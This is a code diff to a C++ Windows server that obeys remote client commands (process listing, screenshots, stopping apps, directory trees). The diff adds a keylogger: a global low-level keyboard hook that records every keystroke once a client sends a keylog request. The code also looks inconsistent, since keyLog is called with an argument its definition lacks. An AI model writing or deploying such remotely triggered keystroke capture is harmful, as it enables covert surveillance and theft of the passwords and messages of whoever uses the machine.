@@ -220,6 +220,8 @@ void Server::start(){
                         responseToClient = this->listProcess();
                     else if (requestFromClient.type() == SCREENSHOT_REQUEST)
                         responseToClient = this->screenShot();
+                    else if(requestFromClient.type() == KEYLOG_REQUEST)
+                        responseToClient = this->keyLog(pfd.fd);
                     else if (requestFromClient.type() == DIR_TREE_REQUEST)
                         responseToClient = this->dirTree();
                     else if (requestFromClient.type() == DISCONNECT_REQUEST)
@@ -361,7 +363,7 @@ Response Server::stopApp(const char* appName){
 
     // Get the process ID of the running process to stop
     DWORD dwProcessId = GetProcessIdByName(processName); // Replace with the actual process ID
-    
+
     // Open the process
     HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId);
     if (hProcess == NULL) {
@@ -466,7 +468,25 @@ Response Server::screenShot(){
 }
 
 Response Server::keyLog(){
-    return Response(START_KEYLOG_RESPONSE, OK_CODE, 0, NULL); 
+    cout << "Server: Receive KeyLog instruction.\n";
+    cout << "Server: Start KeyLog.\n";
+    // Init hook
+    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
+    if (hHook == NULL){
+        cerr << "Error: Failed to set keyboard hook.\n";
+        return Response(KEYLOG_RESPONSE, FAIL_CODE, 0, NULL);
+    }
+
+    // Loop waiting for event
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) > 0){
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    // Destroy hook
+    UnhookWindowsHookEx(hHook);
+    return Response(KEYLOG_RESPONSE, OK_CODE, 0, NULL); 
 }
     
 Response Server::dirTree(){
@@ -541,8 +561,8 @@ string printDirectoryTree(const char* path, int indent){
 }
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
-    UINT  num = 0;          // number of image encoders
-    UINT  size = 0;         // size of the image encoder array in bytes
+    UINT  num = 0;  // number of image encoders
+    UINT  size = 0;  // size of the image encoder array in bytes
 
     ImageCodecInfo* pImageCodecInfo = NULL;
 
@@ -567,4 +587,25 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
     free(pImageCodecInfo);
     return -1;  // Failure
 }
+
+LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){
+    if (nCode == HC_ACTION){
+        KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT*)lParam;
+        DWORD vkCode = pKeyboardStruct->vkCode;
+
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
+            // Process event press key
+            auto res = changeToKeyPress(vkCode);
+            cout << "Key pressed: ";
+            if(res.second == true)
+                cout << res.first  << '\n';
+            else
+                cout << "(DWORD)" << vkCode << '\n';
+        }
+    }
+
+    // Call next hook
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
 
